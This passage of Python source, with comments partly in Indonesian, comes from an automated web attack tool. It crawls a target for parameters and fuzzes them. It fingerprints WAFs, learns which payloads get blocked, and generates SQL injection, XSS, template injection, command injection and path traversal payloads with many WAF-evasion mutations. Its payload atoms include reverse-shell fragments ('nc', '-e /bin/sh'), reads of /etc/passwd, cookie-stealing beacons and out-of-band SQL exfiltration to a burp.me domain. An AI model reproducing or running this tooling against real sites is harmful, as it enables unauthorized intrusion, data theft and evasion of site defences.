                loc = "hidden" if inp_type == "hidden" else "form_input"
                self.parameters.append(Parameter(
                    name=name, location=loc, method=method, url=form_url,
                    original_value=inp.get("value", ""), input_type=inp_type,
                    form_action=action, form_id=form_id,
                    context={"form_id": form_id, "input_type": inp_type},
                ))

    def _extract_hidden_params(self, html: str):
        meta = re.findall(r'<meta[^>]+content="[^"]*[?&]([^=&"]+)=', html, re.I)
        for name in meta:
            self.parameters.append(Parameter(name=name, location="hidden", method="GET", url=self.target))
        comments = re.findall(r'<!--(.*?)-->', html, re.S)
        pp = re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=')
        for c in comments:
            for m in pp.findall(c):
                self.parameters.append(Parameter(name=m, location="hidden", method="GET",
                    url=self.target, context={"source": "comment"}))
        data = re.findall(r'data-(?:url|href|action|api|endpoint)=["\']([^"\']+\?[^"\']+)["\']', html, re.I)
        for u in data:
            full = urljoin(self.target, u)
            parsed = urlparse(full)
            if parsed.query:
                for name in parse_qs(parsed.query):
                    self.parameters.append(Parameter(name=name, location="hidden", method="GET",
                        url=full.split("?")[0], context={"source": "data_attribute"}))

    def _extract_js_endpoints(self, html: str):
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.S | re.I)
        ext = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I)
        for u in ext[:8]:
            c = self._fetch_page(urljoin(self.target, u))
            if c: scripts.append(c)
        patterns = [
            r'["\']([/a-zA-Z0-9_/-]+\?[a-zA-Z_][a-zA-Z0-9_]*=)["\']',
            r'fetch\s*$\s*["\']([^"\']+\?[^"\']+)["\']',
            r'\.ajax\s*$\s*\{[^}]*url:\s*["\']([^"\']+)["\']',
            r'axios\.[a-z]+\s*$\s*["\']([^"\']+)["\']',
            r'window\.location\s*=\s*["\']([^"\']+\?[^"\']+)["\']',
            r'\.get\s*$\s*["\']([^"\']+\?[^"\']+)["\']',
            r'\.post\s*$\s*["\']([^"\']+\?[^"\']+)["\']',
        ]
        for s in scripts:
            for pat in patterns:
                for m in re.findall(pat, s):
                    full = urljoin(self.target, m)
                    parsed = urlparse(full)
                    if parsed.query:
                        for name in parse_qs(parsed.query):
                            self.parameters.append(Parameter(name=name, location="ajax",
                                method="GET", url=full.split("?")[0],
                                context={"source": "js_endpoint"}))

    def _deep_crawl_links(self, html: str):
        if not HAS_BS4: return
        soup = BeautifulSoup(html, "html.parser")
        links = set()
        skip = ['.jpg','.jpeg','.png','.gif','.svg','.webp','.css','.js','.pdf',
                '.zip','.ico','.woff','.woff2','.ttf','.eot','.mp4','.mp3']
        for a in soup.find_all("a", href=True):
            full = urljoin(self.target, a["href"])
            p = urlparse(full)
            if p.netloc == self.parsed.netloc and not any(p.path.lower().endswith(e) for e in skip):
                links.add(full); self.discovered_urls.add(full)
                if p.query:
                    for name, vals in parse_qs(p.query).items():
                        self.parameters.append(Parameter(name=name, location="url_query",
                            method="GET", url=full.split("?")[0],
                            original_value=vals[0] if vals else "",
                            context={"source": "internal_link"}))
        print(f"      Level 1: Found {len(links)} internal links")
        crawled = 0
        for url in list(links)[:25]:
            try:
                h = self._fetch_page(url)
                if not h: continue
                crawled += 1
                self._extract_form_params(h); self._extract_hidden_params(h)
                self._extract_js_endpoints(h)
                sub = BeautifulSoup(h, "html.parser")
                for a in sub.find_all("a", href=True):
                    sf = urljoin(url, a["href"]); sp = urlparse(sf)
                    if sp.netloc == self.parsed.netloc:
                        self.discovered_urls.add(sf)
                        if sp.query:
                            for name, vals in parse_qs(sp.query).items():
                                self.parameters.append(Parameter(name=name, location="url_query",
                                    method="GET", url=sf.split("?")[0],
                                    original_value=vals[0] if vals else "",
                                    context={"source": "deep_crawl_l2"}))
                time.sleep(0.1)
            except: continue
        print(f"      Level 2: Crawled {crawled} pages, {len(self.discovered_urls)} URLs total")

    def _scan_robots_sitemap(self):
        robots = self._fetch_page(f"{self.base_url}/robots.txt")
        rpaths = []
        if robots:
            urls = re.findall(r'(?:Disallow|Allow):\s*(/[^\s#]+)', robots)
            for path in urls[:40]:
                full = urljoin(self.base_url, path); p = urlparse(full)
                if p.query:
                    for name in parse_qs(p.query):
                        self.parameters.append(Parameter(name=name, location="robots_txt",
                            method="GET", url=full.split("?")[0], context={"source": "robots.txt"}))
                else:
                    clean = full.rstrip("*").rstrip("$")
                    if not any(c in clean for c in ['*','$','{','}']):
                        rpaths.append(clean); self.discovered_urls.add(clean)
        for surl in [f"{self.base_url}/sitemap.xml", f"{self.base_url}/sitemap_index.xml"]:
            sc = self._fetch_page(surl)
            if sc:
                for u in re.findall(r'<loc>(.*?)</loc>', sc)[:80]:
                    p = urlparse(u)
                    if p.query:
                        for name, vals in parse_qs(p.query).items():
                            self.parameters.append(Parameter(name=name, location="sitemap",
                                method="GET", url=u.split("?")[0],
                                original_value=vals[0] if vals else "",
                                context={"source": "sitemap"}))
                    else:
                        self.discovered_urls.add(u)

    def _fuzz_parameters(self):
        urls = set()
        urls.add(self.target.split("?")[0])
        urls.add(f"{self.base_url}/")
        urls.add(f"{self.base_url}/index.php")
        for u in list(self.discovered_urls)[:15]:
            urls.add(u.split("?")[0])
        baselines = {}
        for u in list(urls)[:15]:
            r = self._fetch_page_raw(u)
            if r and r[0]:
                baselines[u] = {"text": r[0], "status": r[1], "size": r[2]}
            time.sleep(0.05)
        found = 0; tested = 0
        params = self.COMMON_PARAMS[:50]
        for url in list(baselines.keys())[:15]:
            bl = baselines[url]
            for pn in params:
                tested += 1
                tu = f"{url}{'&' if '?' in url else '?'}{pn}=1"
                try:
                    r = self._fetch_page_raw(tu)
                    if not r or not r[0]: continue
                    rt, rs, rz = r
                    active = False; reason = ""
                    if rs != bl["status"] and rs == 200:
                        active = True; reason = f"status {bl['status']}→{rs}"
                    if bl["size"] > 0:
                        diff = abs(rz - bl["size"])
                        pct = (diff / bl["size"]) * 100
                        if pct > 5 and diff > 100:
                            active = True; reason = f"size diff {pct:.1f}%"
                    errors = ["error","invalid","not found","undefined","syntax","warning",
                             "notice","exception","mysql","sql","query","database","required","missing"]
                    rl = rt.lower(); btl = bl["text"].lower()
                    for e in errors:
                        if e in rl and e not in btl:
                            active = True; reason = f"error: '{e}'"; break
                    if active:
                        if not any(p.name == pn and p.url == url for p in self.parameters):
                            self.parameters.append(Parameter(name=pn, location="fuzzed",
                                method="GET", url=url, original_value="1",
                                context={"source": "fuzzing", "reason": reason, "status": rs}))
                            found += 1
                            print(f"      \033[32m[+]\033[0m Fuzzed: \033[37m{pn}\033[0m → {reason}")
                    time.sleep(0.03)
                except: continue
        print(f"      Tested {tested}, found \033[32m{found}\033[0m active params")

    def _scan_common_endpoints(self):
        eps = [
            ("/index.php", ["id","page","cat","action","view","mod"]),
            ("/article.php", ["id","id_artikel","slug"]),
            ("/post.php", ["id","id_post","slug"]),
            ("/news.php", ["id","id_news","id_berita"]),
            ("/detail.php", ["id","id_item"]),
            ("/read.php", ["id","slug"]),
            ("/search.php", ["q","search","keyword","s"]),
            ("/category.php", ["id","cat","cid"]),
            ("/product.php", ["id","pid","sku"]),
            ("/profile.php", ["id","uid","user"]),
            ("/download.php", ["file","id","path"]),
            ("/page.php", ["id","page","p"]),
            ("/berita.php", ["id","id_berita"]),
            ("/artikel.php", ["id","id_artikel"]),
            ("/api/search", ["q","query","keyword"]),
        ]
        found = 0
        for path, params in eps:
            eu = f"{self.base_url}{path}"
            try:
                r = self._fetch_page_raw(eu)
                if r and r[0] and r[1] < 400:
                    found += 1
                    for pn in params:
                        if not any(p.name == pn and p.url == eu for p in self.parameters):
                            self.parameters.append(Parameter(name=pn, location="endpoint",
                                method="GET", url=eu, context={"source": "endpoint"}))
                    print(f"      \033[32m[+]\033[0m Endpoint: {path} ({', '.join(params[:3])})")
                time.sleep(0.05)
            except: continue
        print(f"      Found {found} active endpoints")

    def _detect_path_params(self):
        urls = list(self.discovered_urls)[:30] + [self.target]
        patterns = [
            (r'/(\d+)$', 'id'), (r'/([a-z0-9-]+)$', 'slug'),
            (r'/read/(\d+)', 'id'), (r'/read/([a-z0-9-]+)', 'slug'),
            (r'/detail/(\d+)', 'id'), (r'/post/(\d+)', 'id'),
            (r'/article/(\d+)', 'id'), (r'/berita/(\d+)', 'id'),
            (r'/artikel/(\d+)', 'id'), (r'/category/([^/]+)', 'cat'),
            (r'/tag/([^/]+)', 'tag'), (r'/user/([^/]+)', 'user'),
        ]
        found = 0
        for url in urls:
            path = urlparse(url).path
            for pat, pn in patterns:
                m = re.search(pat, path, re.I)
                if m:
                    if not any(p.name == pn and p.location == "path" and p.url == url for p in self.parameters):
                        self.parameters.append(Parameter(name=pn, location="path",
                            method="GET", url=url, original_value=m.group(1),
                            context={"source": "path_detection"}))
                        found += 1
                    break
        if found: print(f"      Found {found} path-based parameters")


# ============================================================
# FEEDBACK LEARNER (preserved from v5.0 + v6.0 rate limit tracking)
# ============================================================
class FeedbackLearner:
    """Memperbarui bobot generator berdasarkan hasil respons sebelumnya."""
    def __init__(self):
        self.category_scores = defaultdict(lambda: {"success": 0, "fail": 0, "raw_html": 0, "blocked": 0})
        self.encoding_scores = defaultdict(lambda: {"success": 0, "fail": 0})
        self.tier_scores = defaultdict(lambda: {"success": 0, "fail": 0})
        self.strategy_scores = defaultdict(lambda: {"success": 0, "fail": 0})
        self.waf_detected = False
        self.waf_type = ""
        self.waf_signatures = []
        self.blocked_patterns = []
        self.successful_patterns = []
        self.server_tech = {"language": "", "framework": "", "database": ""}
        self.response_times = []
        self.baseline_response_time = 0
        self.category_weights = {
            "sqli": 0.30, "xss": 0.25, "ssti": 0.15,
            "cmdi": 0.10, "lfi": 0.10, "xxe": 0.02,
            "crlf": 0.02, "redirect": 0.01, "polyglot": 0.05
        }
        self.lr = 0.15
        self.history = []
        self.blocked_mutations = set()
        self.mutation_fail_count = defaultdict(int)
        self.blocked_encodings = set()
        self.encoding_fail_count = defaultdict(int)
        self.rate_limit_count = 0
        self.last_rate_limit_time = 0

    def record_feedback(self, payload_dict: Dict, result):
        cat = payload_dict.get("category", "unknown")
        encoding = payload_dict.get("encoding", "raw")
        tier = payload_dict.get("length_tier", "short")
        strategy = payload_dict.get("strategy", "unknown")
        mutations = payload_dict.get("mutation_history", [])
        resp_type = result.response_type
        status = result.status_code
        resp_time = result.response_time_ms

        if resp_time > 0:
            self.response_times.append(resp_time)
            if len(self.response_times) >= 10:
                self.baseline_response_time = sum(self.response_times[-50:]) / len(self.response_times[-50:])

        if status == 429:
            self.rate_limit_count += 1
            self.last_rate_limit_time = time.time()

        if resp_type == "server_output":
            self.category_scores[cat]["success"] += 1
            self.encoding_scores[encoding]["success"] += 1
            self.tier_scores[tier]["success"] += 1
            self.strategy_scores[strategy]["success"] += 1
            self.successful_patterns.append({
                "category": cat, "encoding": encoding, "tier": tier,
                "strategy": strategy, "mutations": mutations,
                "payload": payload_dict.get("payload", "")[:100],
                "evidence": result.evidence[:100]
            })
        elif resp_type == "raw_html":
            self.category_scores[cat]["raw_html"] += 1
            self.encoding_scores[encoding]["fail"] += 1
        elif resp_type == "blocked":
            self.category_scores[cat]["blocked"] += 1
            self.blocked_patterns.append({
                "category": cat, "encoding": encoding,
                "mutations": mutations,
                "payload_snippet": payload_dict.get("payload", "")[:50],
                "status": status
            })
            self._detect_waf(result.evidence, status)
            for mut in mutations:
                self.mutation_fail_count[mut] += 1
                if self.mutation_fail_count[mut] >= 3:
                    self.blocked_mutations.add(mut)
            self.encoding_fail_count[encoding] += 1
            if self.encoding_fail_count[encoding] >= 5:
                self.blocked_encodings.add(encoding)

        self._detect_tech(result.evidence, status)
        self._adjust_weights()
        self.history.append({
            "category": cat, "encoding": encoding, "tier": tier,
            "strategy": strategy, "mutations": mutations,
            "response_type": resp_type, "status": status,
            "response_time": resp_time
        })

    def _detect_waf(self, evidence: str, status: int):
        signs = {
            "cloudflare": ["cloudflare","cf-ray","attention required"],
            "modsecurity": ["mod_security","not acceptable","406"],
            "incapsula": ["incapsula","imperva"],
            "sucuri": ["sucuri","cloudproxy"],
            "akamai": ["akamai","reference"],
            "aws_waf": ["aws","waf","captcha"],
            "f5": ["f5 networks","big-ip"],
        }
        el = evidence.lower()
        for name, s in signs.items():
            for sig in s:
                if sig in el:
                    self.waf_detected = True; self.waf_type = name
                    self.waf_signatures.append(sig)
        if status in [403, 406, 429, 503]:
            self.waf_detected = True

    def _detect_tech(self, evidence: str, status: int):
        el = evidence.lower()
        if "php" in el or "laravel" in el: self.server_tech["language"] = "PHP"
        elif "python" in el or "django" in el: self.server_tech["language"] = "Python"
        elif "java" in el or "spring" in el: self.server_tech["language"] = "Java"
        elif "asp.net" in el or ".net" in el: self.server_tech["language"] = "ASP.NET"
        elif "node" in el or "express" in el: self.server_tech["language"] = "Node.js"
        if "mysql" in el: self.server_tech["database"] = "MySQL"
        elif "postgresql" in el: self.server_tech["database"] = "PostgreSQL"
        elif "oracle" in el or "ora-" in el: self.server_tech["database"] = "Oracle"
        elif "sqlite" in el: self.server_tech["database"] = "SQLite"
        if "django" in el: self.server_tech["framework"] = "Django"
        elif "flask" in el: self.server_tech["framework"] = "Flask"
        elif "spring" in el: self.server_tech["framework"] = "Spring"
        elif "laravel" in el: self.server_tech["framework"] = "Laravel"

    def _adjust_weights(self):
        total = sum(v["success"] for v in self.category_scores.values())
        if total == 0: return
        for cat, scores in self.category_scores.items():
            if cat in self.category_weights:
                t = scores["success"] + scores["fail"] + scores["raw_html"] + scores["blocked"]
                sr = scores["success"] / max(1, t)
                if sr > 0.3:
                    self.category_weights[cat] += self.lr * sr
                elif scores["blocked"] > scores["success"] * 3:
                    self.category_weights[cat] *= 0.8
        s = sum(self.category_weights.values())
        if s > 0:
            for cat in self.category_weights:
                self.category_weights[cat] /= s

    def get_adaptive_weights(self) -> List[float]:
        cats = ["sqli","xss","ssti","cmdi","lfi","xxe","crlf","redirect","polyglot"]
        return [self.category_weights.get(c, 0.01) for c in cats]

    def get_learning_summary(self) -> str:
        lines = []
        if self.server_tech["language"]: lines.append(f"Server: {self.server_tech['language']}")
        if self.server_tech["framework"]: lines.append(f"FW: {self.server_tech['framework']}")
        if self.server_tech["database"]: lines.append(f"DB: {self.server_tech['database']}")
        if self.waf_detected: lines.append(f"WAF: {self.waf_type or 'Detected'}")
        if self.blocked_mutations: lines.append(f"Blacklisted: {len(self.blocked_mutations)} muts")
        if self.rate_limit_count > 0: lines.append(f"429s: {self.rate_limit_count}")
        if self.successful_patterns:
            best = max(self.category_scores.keys(),
                      key=lambda c: self.category_scores[c]["success"], default="")
            if best: lines.append(f"Best: {best}")
        return " | ".join(lines) if lines else "Learning..."


# ============================================================
# ML PAYLOAD GENERATOR (preserved from v5.0)
# ============================================================
class MLPayloadGenerator:
    """Membangun payload berbasis atom, encoding, dan strategi mutasi."""
    ATOMS = {
        "sql_string_break": ["'",'"',"`","''",'""',"\\'","\\\"","%27","%22"],
        "sql_logic": ["OR","AND","XOR","NOT","&&","||","DIV"],
        "sql_comment": ["--","#","/**/",";--",";#","-- -","/*!*/","--+","%23"],
        "sql_keyword": ["SELECT","UNION","FROM","WHERE","SLEEP","BENCHMARK",
                        "WAITFOR","DELAY","ORDER","GROUP","HAVING","LIMIT",
                        "INSERT","UPDATE","DELETE","DROP","EXEC","EXECUTE",
                        "CAST","CONVERT","CHAR","CONCAT","SUBSTRING","ASCII"],
        "sql_func": ["CONCAT()","CHAR()","SUBSTRING()","ASCII()","LENGTH()",
                     "VERSION()","DATABASE()","USER()","CURRENT_USER",
                     "LOAD_FILE()","INTO OUTFILE","INFORMATION_SCHEMA",
                     "COUNT(*)","GROUP_CONCAT()","HEX()","UNHEX()"],
        "xss_open": ["<","&lt;","%3C","\\u003c","\\x3c","&Tab;<","&NewLine;<","&#60;","&#x3c;"],
        "xss_tag": ["script","img","svg","iframe","body","input","details",
                    "video","audio","marquee","math","object","embed",
                    "link","meta","base","form","button","select","textarea",
                    "style","div","span","a","p"],
        "xss_event": ["onload","onerror","onmouseover","onfocus","onblur",
                      "onanimationend","ontransitionend","onwheel","onclick",
                      "onsubmit","onchange","oninput","onkeydown","onkeyup",
                      "onkeypress","onmousedown","onmouseup","onmouseout",
                      "ondblclick","oncontextmenu","ondrag","ondragend",
                      "ondragenter","ondragleave","ondragover","ondragstart",
                      "ondrop","onscroll","onresize","ontouchstart",
                      "ontouchend","ontouchmove","onpointerdown",
                      "onpointerup","onanimationstart","onanimationiteration",
                      "onafterprint","onbeforeprint","onbeforeunload",
                      "onhashchange","onmessage","onoffline","ononline",
                      "onpagehide","onpageshow","onpopstate","onstorage",
                      "onunload","oncopy","oncut","onpaste","onabort",
                      "oncanplay","oncanplaythrough","ondurationchange",
                      "onemptied","onended","onloadeddata","onloadedmetadata",
                      "onloadstart","onpause","onplay","onplaying","onprogress",
                      "onratechange","onseeked","onseeking","onstalled",
                      "onsuspend","ontimeupdate","onvolumechange","onwaiting",
                      "onshow","ontoggle"],
        "xss_js": ["alert(1)","confirm(1)","prompt(1)","console.log(1)",
                   "fetch('//x')","eval('1')","Function('1')()",
                   "alert`1`","alert.call(null,1)","window['alert'](1)",
                   "self['alert'](1)","this['alert'](1)","top['alert'](1)",
                   "document['cookie']","location='//x'",
                   "navigator.sendBeacon('//x')","new Image().src='//x'",
                   "setTimeout('alert(1)')","setInterval('alert(1)')",
                   "requestAnimationFrame('alert(1)')",
                   "Promise.resolve().then(_=>alert(1))"],
        "xss_context_break": ["\">","'>","``>","}}>","])>", "/>",
                              "\"autofocus ","' autofocus ",
                              "\" onfocus=\"","' onfocus='"],
        "ssti_open": ["{{","${","#{","<%=","<%","{%","${{","<#","{{-","${#",
                      "<%#","{{{","[[","{#"],
        "ssti_close": ["}}","}","%>","%}","}}}","%}}","-}}","]]","#}"],
        "ssti_expr": ["7*7","7*'7'","range(7)","7..7","1+1","'x'*7",
                      "config","request","self","self.__class__",
                      "''|attr('__class__')","().__class__","[].__class__",
                      "cycler.__init__.__globals__","lipsum.__globals__",
                      "''.__class__.__mro__[1].__subclasses__()",
                      "request.application.__globals__"],
        "cmd_sep": [";","|","||","&&","&","`","$(","\\n","%0a","%0d%0a",
                    "\\|&",";{","$IFS","${IFS}","%09"],
        "cmd_exec": ["sleep","id","whoami","uname","ls","pwd","cat","echo",
                     "wget","curl","ping","nslookup","dig","nc",
                     "python","perl","ruby","php","bash","sh",
                     "powershell","cmd","certutil","bitsadmin"],
        "cmd_arg": ["5","1","-a","/","/etc/passwd","-c 1",
                    "-n 1 127.0.0.1","-la","/tmp","http://x.test",
                    "-e /bin/sh","-i","-p 80"],
        "path_traversal": ["../","..\\","....//","..;/","%2e%2e%2f",
                          "%252e%252e%252f","..%252f","..%c0%af",
                          "..%c1%9c","..%ef%bc%8f","..%2f",
                          "..\\\\\\\\","..../","..\\\\../"
                          "%c0%ae%c0%ae/","%c0%ae%c0%ae\\",
                          "..%25%32%66","..%25%35%63"],
        "null_byte": ["%00","\\0","\\x00","%0a","%0d"],
        "whitespace": [" ","\\t","\\n","\\r","%09","%0a","%0d","/**/",
                       "/*x*/","/**x**/","+","%20","%0b","%0c","/*!*/","/*!50000*/"],
    }
    CATEGORIES = ["sqli","xss","ssti","cmdi","lfi","xxe","crlf","redirect","polyglot"]

    def __init__(self, learner: FeedbackLearner = None,
                 grammar: GrammarValidator = None,
                 encoder: AdaptiveEncodingRotation = None,
                 waf_bypass: WAFBypassEngine = None,
                 polyglot: PolyglotGenerator = None):
        self.learner = learner or FeedbackLearner()
        self.grammar = grammar or GrammarValidator()
        self.encoder = encoder or AdaptiveEncodingRotation()
        self.waf_bypass = waf_bypass or WAFBypassEngine()
        self.polyglot = polyglot or PolyglotGenerator()
        self.generated_payloads: List[Dict] = []
        self.rng = random.Random()
        self.payload_counter = 0

    def _pick(self, key): return self.rng.choice(self.ATOMS[key])

    def _enc_raw(self, s): return s
    def _enc_url(self, s): return quote(s, safe="")
    def _enc_double_url(self, s): return quote(quote(s, safe=""), safe="")
    def _enc_triple_url(self, s): return quote(quote(quote(s, safe=""), safe=""), safe="")
    def _enc_unicode(self, s):
        return "".join(f"\\u{ord(c):04x}" if random.random() < 0.4 else c for c in s)
    def _enc_html_entity(self, s):
        return "".join(f"&#{ord(c)};" if random.random() < 0.4 else c for c in s)
    def _enc_hex(self, s):
        return "".join(f"\\x{ord(c):02x}" if random.random() < 0.4 else c for c in s)
    def _enc_octal(self, s):
        return "".join(f"\\{ord(c):03o}" if random.random() < 0.4 else c for c in s)
    def _enc_mixed(self, s):
        return random.choice([self._enc_url, self._enc_unicode, self._enc_html_entity,
                              self._enc_hex, self._enc_octal])(s)

    def _mut_case_variation(self, s):
        return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s)
    def _mut_comment_injection(self, s):
        cs = ["/**/","/*!*/","/**x**/","/*!50000*/","/*x*/"]
        r = s
        for kw in ["SELECT","UNION","FROM","WHERE","AND","OR","script","alert"]:
            if kw.lower() in r.lower():
                c = random.choice(cs)
                r = re.sub(re.escape(kw), f"{kw[:2]}{c}{kw[2:]}", r, count=1, flags=re.I)
        return r
    def _mut_whitespace_padding(self, s):
        ws = random.choice(["  ","\\t","\\n","%09","%0a","%0d","/**/","/*x*/"])
        return f"{ws}{s}{ws}"
    def _mut_char_encoding(self, s):
        r = []
        for c in s:
            rv = random.random()
            if rv < 0.2: r.append(f"&#x{ord(c):x};")
            elif rv < 0.4: r.append(f"%{ord(c):02x}")
            elif rv < 0.5: r.append(f"\\x{ord(c):02x}")
            else: r.append(c)
        return "".join(r)
    def _mut_string_concat(self, s):
        if len(s) < 4: return s
        m = len(s) // 2
        meth = random.choice(["plus","concat","join"])
        if meth == "plus": return f"'{s[:m]}'+'{s[m:]}'"
        elif meth == "concat": return f"CONCAT('{s[:m]}','{s[m:]}')"
        else: return f"['{s[:m]}','{s[m:]}'].join('')"
    def _mut_null_byte_append(self, s): return s + random.choice(["%00","\\0","\\x00"])
    def _mut_unicode_normalize(self, s):
        reps = {'/':['⁄','∕','／'],'<':['＜','‹'],'>':['＞','›'],'"':['＂','"'],"'":["＇","'"],'&':['＆']}
        r = list(s)
        for i,c in enumerate(r):
            if c in reps and random.random() < 0.3: r[i] = random.choice(reps[c])
        return "".join(r)
    def _mut_double_encoding(self, s): return self._enc_double_url(s)
    def _mut_html_entity_mix(self, s): return self._enc_html_entity(s)
    def _mut_nested_encoding(self, s):
        r = s
        for _ in range(random.randint(2,3)):
            r = random.choice([self._enc_url, self._enc_html_entity, self._enc_hex])(r)
        return r
    def _mut_keyword_split(self, s):
        for kw in ["SELECT","UNION","script","alert","onerror","onload"]:
            if kw.lower() in s.lower():
                sp = random.randint(1, len(kw)-1)
                sep = random.choice(["/**/","/*!*/","/**x**/","\\t"])
                s = re.sub(re.escape(kw), f"{kw[:sp]}{sep}{kw[sp:]}", s, count=1, flags=re.I)
        return s
    def _mut_alternative_syntax(self, s):
        reps = {
            "alert(":["alert`","alert.call(null,","window['alert'](","self['alert']("],
            "SELECT":["SELECT ALL","SELECT DISTINCT","SELECT TOP 1"],
            "OR ":["|| ","OR/**/ "],"AND ":["&& ","AND/**/ "],
        }
        for old, alts in reps.items():
            if old.lower() in s.lower():
                s = re.sub(re.escape(old), random.choice(alts), s, count=1, flags=re.I)
        return s
    def _mut_homoglyph(self, s):
        h = {'a':['а','ɑ'],'e':['е','ε'],'o':['о','ο'],'i':['і','ι'],'c':['с'],'p':['р']}
        r = list(s)
        for i,c in enumerate(r):
            if c.lower() in h and random.random() < 0.2: r[i] = random.choice(h[c.lower()])
        return "".join(r)
    def _mut_backslash_escape(self, s):
        return "".join(f"\\{c}" if random.random() < 0.2 and c.isalpha() else c for c in s)
    def _mut_newline_injection(self, s):
        nl = random.choice(["\\n","\\r\\n","%0a","%0d%0a"])
        if len(s) > 5:
            p = random.randint(2, len(s)-2)
            return s[:p] + nl + s[p:]
        return s
    def _mut_tab_separation(self, s):
        tab = random.choice(["\\t","%09","%0b"])
        return s.replace(" ", tab) if " " in s else f"{tab}{s}{tab}"
    def _mut_block_comment_wrap(self, s):
        pad = random.choice(["x"*10,"a"*20,"0"*15])
        return f"/*{pad}*/{s}/*{pad}*/"
    def _mut_inline_comment_split(self, s):
        return s.replace(" ", random.choice(["/**/","/*!*/","/**/"]))
    def _mut_recursive_encode(self, s):
        tc = random.sample("'\"<>();",min(3,len("'\"<>();")))
        return "".join(f"%{ord(c):02x}" if c in tc else c for c in s)
    def _mut_zero_width_insert(self, s):
        zw = ["\\u200b","\\u200c","\\u200d","\\ufeff","\\u2060"]
        r = list(s)
        for i in range(len(r)):
            if random.random() < 0.15: r.insert(i, random.choice(zw))
        return "".join(r)

    def _get_all_mutations(self):
        return [
            self._mut_case_variation, self._mut_comment_injection,
            self._mut_whitespace_padding, self._mut_char_encoding,
            self._mut_string_concat, self._mut_null_byte_append,
            self._mut_unicode_normalize, self._mut_double_encoding,
            self._mut_html_entity_mix, self._mut_nested_encoding,
            self._mut_keyword_split, self._mut_alternative_syntax,
            self._mut_homoglyph, self._mut_backslash_escape,
            self._mut_newline_injection, self._mut_tab_separation,
            self._mut_block_comment_wrap, self._mut_inline_comment_split,
            self._mut_recursive_encode, self._mut_zero_width_insert,
        ]

    def _apply_mutations(self, payload: str, num: int = 0) -> str:
        if num == 0: num = random.randint(0, 3)
        muts = self._get_all_mutations()
        for _ in range(num):
            m = random.choice(muts)
            try: payload = m(payload)
            except: continue
        return payload

    def _build_sqli(self, tier):
        strats = ["error_based","union_based","time_based","boolean_based",
                  "stacked_query","second_order","out_of_band","inline_comment",
                  "case_variation","encoding_bypass","nested_subquery",
                  "having_group","order_by_probe","limit_offset",
                  "between_like","rlike_regexp","procedure_analyse"]
        s = self.rng.choice(strats)
        q = self._pick("sql_string_break"); c = self._pick("sql_comment"); ws = self._pick("whitespace")
        if s == "error_based":
            l = self._pick("sql_logic")
            if tier == "short": return f"{q}{ws}{l}{ws}1=1{c}", s
            return (f"{q}{ws}{l}{ws}(SELECT{ws}1{ws}FROM{ws}(SELECT{ws}"
                    f"COUNT(*),CONCAT(0xdeadbeef,FLOOR(RAND(0)*2))x{ws}FROM{ws}"
                    f"information_schema.tables{ws}GROUP{ws}BY{ws}x)a){c}"), s
        elif s == "union_based":
            cols = self.rng.randint(1, 10); nulls = ",".join(["NULL"] * cols)
            if tier == "short": return f"{q}{ws}UNION{ws}SELECT{ws}{nulls}{c}", s
            return (f"{q}{ws}UNION{ws}ALL{ws}SELECT{ws}{nulls},CONCAT(0x7e,VERSION(),0x7e),"
                    f"{nulls}{ws}FROM{ws}information_schema.tables{c}"), s
        elif s == "time_based":
            d = self.rng.choice([3,5,7,10])
            return self.rng.choice([
                f"{q};{ws}WAITFOR{ws}DELAY{ws}'0:0:{d}'{c}",
                f"{q}{ws}AND{ws}SLEEP({d}){c}",
                f"{q}{ws}AND{ws}(SELECT{ws}*{ws}FROM{ws}(SELECT(SLEEP({d})))a){c}",
                f"{q};{ws}SELECT{ws}BENCHMARK(10000000,MD5(0xdead)){c}",
                f"{q}{ws}AND{ws}IF(1=1,SLEEP({d}),0){c}",
            ]), s
        elif s == "boolean_based":
            return self.rng.choice([
                f"{q}{ws}AND{ws}1=1",f"{q}{ws}AND{ws}1=2",
                f"{q}{ws}OR{ws}1=1{c}",f"{q}{ws}OR{ws}1=2{c}",
                f"{q}{ws}AND{ws}SUBSTRING(@@version,1,1)='5'",
                f"{q}{ws}AND{ws}ASCII(SUBSTRING((SELECT{ws}database()),1,1))>64",
            ]), s
        elif s == "stacked_query": return f"{q};{ws}SELECT{ws}{self.rng.randint(1,999)}{c}", s
        elif s == "second_order": return f"{q};{ws}INSERT{ws}INTO{ws}logs{ws}VALUES('{q}){c}", s
        elif s == "out_of_band":
            dom = f"{self.rng.randint(1000,9999)}.burp.me"
            return f"{q};{ws}SELECT{ws}LOAD_FILE(CONCAT('\\\\\\\\',(SELECT{ws}version()),'.{dom}\\\\a')){c}", s
        elif s == "inline_comment": return f"{q}/*!50000{ws}AND{ws}1=1*/{c}", s
        elif s == "case_variation": return self._mut_case_variation(f"{q} AnD 1=1 {c}"), s
        elif s == "encoding_bypass": return self._mut_char_encoding(f"{q} OR 1=1{c}"), s
        elif s == "nested_subquery":
            return (f"{q}{ws}AND{ws}(SELECT{ws}1{ws}WHERE{ws}(SELECT{ws}1{ws}WHERE{ws}"
                    f"(SELECT{ws}COUNT(*){ws}FROM{ws}information_schema.tables)>0))=1{c}"), s
        elif s == "having_group": return f"{q}{ws}HAVING{ws}1=1{c}", s
        elif s == "order_by_probe": return f"{q}{ws}ORDER{ws}BY{ws}{self.rng.randint(1,50)}{c}", s
        elif s == "limit_offset": return f"{q}{ws}LIMIT{ws}1{ws}OFFSET{ws}0{c}", s
        elif s == "between_like": return f"{q}{ws}AND{ws}1{ws}BETWEEN{ws}0{ws}AND{ws}2{c}", s
        elif s == "rlike_regexp": return f"{q}{ws}RLIKE{ws}'^.{self.rng.randint(1,10)}$'{c}", s
        elif s == "procedure_analyse": return f"{q}{ws}PROCEDURE{ws}ANALYSE(){c}", s
        return f"{q}{ws}OR{ws}1=1{c}", s

    def _build_xss(self, tier):
        strats = ["classic_tag","event_handler","svg_animate","math_xlink",
                  "details_open","iframe_srcdoc","input_onfocus","body_onpageshow",
                  "marquee_onstart","video_source","object_data","embed_src",
                  "mutation_xss","dom_xss","polyglot","template_injection",
                  "svg_script","math_mtext","noscript_exit","style_import",
                  "svg_use","foreign_object","animate_values","svg_set"]
        s = self.rng.choice(strats)
        js = self._pick("xss_js"); ws = self._pick("whitespace")
        if s == "classic_tag":
            return f"<{self._pick('xss_tag')}{ws}{self._pick('xss_event')}={js}>", s
        elif s == "event_handler":
            return f"{self._pick('xss_context_break')}{self._pick('xss_event')}={js}", s
